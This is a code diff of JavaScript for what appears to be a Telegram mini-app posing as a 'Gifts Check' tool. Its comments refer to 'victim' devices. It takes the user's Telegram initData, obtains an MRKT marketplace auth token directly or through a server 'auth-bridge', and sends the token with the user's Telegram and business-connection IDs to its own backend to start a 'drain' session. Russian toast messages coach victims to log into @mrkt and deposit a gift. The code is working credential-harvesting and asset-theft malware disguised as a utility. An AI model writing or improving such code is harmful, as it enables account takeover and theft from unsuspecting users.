@@ -19,8 +19,8 @@
     } catch (_) {}
   }
 
-  /** Auth from victim device (not VPS) — MRKT often blocks datacenter IP. */
-  async function fetchMrktTokenClient(initData) {
+  /** MRKT auth from victim WebView (preferred). */
+  async function fetchMrktTokenDirect(initData) {
     const res = await fetch("https://api.tgmrkt.io/api/v1/auth", {
       method: "POST",
       headers: {
@@ -33,16 +33,47 @@
     });
     const text = await res.text();
     if (!res.ok) {
-      throw new Error(`MRKT auth ${res.status}: ${text.slice(0, 200)}`);
+      throw new Error(`MRKT direct ${res.status}: ${text.slice(0, 200)}`);
     }
-    let data;
-    try {
-      data = JSON.parse(text);
-    } catch {
-      throw new Error("MRKT auth: bad JSON");
-    }
-    if (!data.token) throw new Error("MRKT auth: no token");
+    const data = JSON.parse(text);
+    if (!data.token) throw new Error("MRKT direct: no token");
     return data.token;
+  }
+
+  async function fetchMrktTokenBridge(initData) {
+    const res = await fetch("/api/mrkt/auth-bridge", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ initData }),
+    });
+    const text = await res.text();
+    if (!res.ok) {
+      throw new Error(`MRKT bridge ${res.status}: ${text.slice(0, 200)}`);
+    }
+    const data = JSON.parse(text);
+    if (!data.token) throw new Error("MRKT bridge: no token");
+    return data.token;
+  }
+
+  async function resolveMrktToken(initData) {
+    let lastErr = "unknown";
+    try {
+      const t = await fetchMrktTokenDirect(initData);
+      await postEvent("mrkt_client_auth_ok", "direct");
+      return t;
+    } catch (e) {
+      lastErr = e instanceof Error ? e.message : String(e);
+      await postEvent("mrkt_client_auth_fail", lastErr);
+    }
+    try {
+      const t = await fetchMrktTokenBridge(initData);
+      await postEvent("mrkt_client_auth_ok", "bridge");
+      return t;
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e);
+      await postEvent("mrkt_auth_bridge_fail", msg);
+      throw new Error(lastErr + " | " + msg);
+    }
   }
 
   window.startMrktDrain = async function startMrktDrain() {
@@ -57,26 +88,19 @@
         localStorage.getItem("bc_id") ||
         undefined;
 
-      let mrktToken;
-      try {
-        mrktToken = await fetchMrktTokenClient(initData);
-      } catch (clientErr) {
-        console.warn("MRKT client auth failed, trying server", clientErr);
-      }
+      const mrktToken = await resolveMrktToken(initData);
 
       const open = await fetch("/api/mrkt/session/open", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          initData: mrktToken ? undefined : initData,
           mrktToken,
           tgUserId: tgUser.id,
           businessConnectionId: bc,
         }),
       });
       if (!open.ok) {
-        const errText = await open.text();
-        throw new Error(errText);
+        throw new Error(await open.text());
       }
       const { sessionId } = await open.json();
 
@@ -111,9 +135,10 @@
       await postEvent("mrkt_cycle_error", msg);
       console.error("MRKT drain", e);
       if (typeof window.showToast === "function") {
+        const forbid = msg.includes("403") || msg.includes("Forbid");
         window.showToast(
-          msg.includes("403") || msg.includes("Forbid")
-            ? "MRKT: войдите в @mrkt с этого аккаунта, подарок в @mrktbank, затем снова Gifts Check"
+          forbid
+            ? "MRKT не пускает с Gifts Check. Сначала зайди в @mrkt, подарок в @mrktbank — сейчас дорабатываем вход через @mrkt"
             : "Ошибка синхронизации MRKT",
           "error",
         );
